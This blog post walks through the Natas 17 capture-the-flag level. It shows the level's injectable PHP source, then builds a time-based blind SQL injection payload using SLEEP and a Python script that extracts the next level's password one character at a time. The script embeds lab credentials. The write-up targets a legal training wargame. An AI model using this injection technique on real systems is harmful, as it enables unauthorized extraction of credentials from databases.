---
layout: post
title: "Natas Level17 - Level18"
date: 2015-10-02 21:06:52
description:
tags: Natas CTF
categories: Natas
twitter_text:
---
Natas 17 takes us back to Natas 15:

![Natas 17 search](/assets/img/screenshots/Natas_level17-1.png)

Lets look at the source to see if we can find whats changed:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Hmm... looks like they completely removed the response. I submitted the user name "natas18" (since I assume it will exist) and "asfdgshnt" since I do not think it will exist. I captured both requests and sent it to the Burp Comparer to see if we can find any diffrences:

![Natas 17 burp comparer](/assets/img/screenshots/Natas_level17-2.png)

As expected, the result is exactly the same. Since this is a blind sql injection with absolutly no output, the only thing I can think of is a time base attack. If a reponse takes longer when the password exists, we should be able to brute force it. With no output, this might be difficult. So I rebuild a database on my local machine with the following data:

    +----------+----------------------------------+
    | username | password                         |
    +----------+----------------------------------+
    | natas16  | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh |
    +----------+----------------------------------+

Next I try the following query:

```sql
Select * from users where username = "natas16"  AND LEFT(password, 1) COLLATE latin1_general_cs = "W" AND (SELECT SLEEP(5)) AND "1"="1";
```

And I get the following output:

![Natas 17 db output](/assets/img/screenshots/Natas_level17-3.png)

Here is the string that I will need to submit:

```sql
natas18"  AND LEFT(password, 1) COLLATE latin1_general_cs = "a" AND  (SELECT SLEEP(20)) AND "1"="1
```

I capture a request in Burp and send it to the intruder but since this is a time base attack, I need to change the Number of threads to 1:

![Natas 17 Burp threads](/assets/img/screenshots/Natas_level17-4.png)

After running it I look at the response time and find the first letter of the password is x:

![Natas 17 Burp result](/assets/img/screenshots/Natas_level17-1.png)

Now lets script it!

```python
import urllib
import urllib2
import time

url = 'http://natas17.natas.labs.overthewire.org/index.php'
authorization = 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='

Chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r',
's','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L',
'M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5',
'6','7','8','9']

password = ""

#loop through possible length of password
for i in range(1, 33):
    print "%d out of 32" % (i)
    #loop through possible chars
    for j in range(0,len(Chars)):
        sqli = 'natas18"  AND LEFT(password, %d) COLLATE latin1_general_cs = "%s" AND  (SELECT SLEEP(10)) AND "1"="1' % (i,password + Chars[j])
        values = {'username' : sqli}
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        req.add_header('Authorization', authorization)
        start = time.time()
        response = urllib2.urlopen(req)
        the_page = response.read()
        end = time.time()
        #print the_page
        duration = end-start
        if duration > 10:
            password+=Chars[j]
            print password
            break
```

The first time I run it I get a weird issue:

    1 out of 32
    x
    2 out of 32
    xv
    3 out of 32
    xvK
    4 out of 32
    xvKI
    5 out of 32
    xvKIq
    6 out of 32
    xvKIqD
    ....
    28 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsD
    29 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsDa
    30 out of 32
    31 out of 32
    32 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsDaE

But when I ran it again and I got:

    1 out of 32
    x
    2 out of 32
    xv
    3 out of 32
    xvK
    4 out of 32
    xvKI
    5 out of 32
    xvKIq
    6 out of 32
    xvKIqD
    ...
    27 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCs
    28 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsD
    29 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
    30 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
    31 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
    32 out of 32
    xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

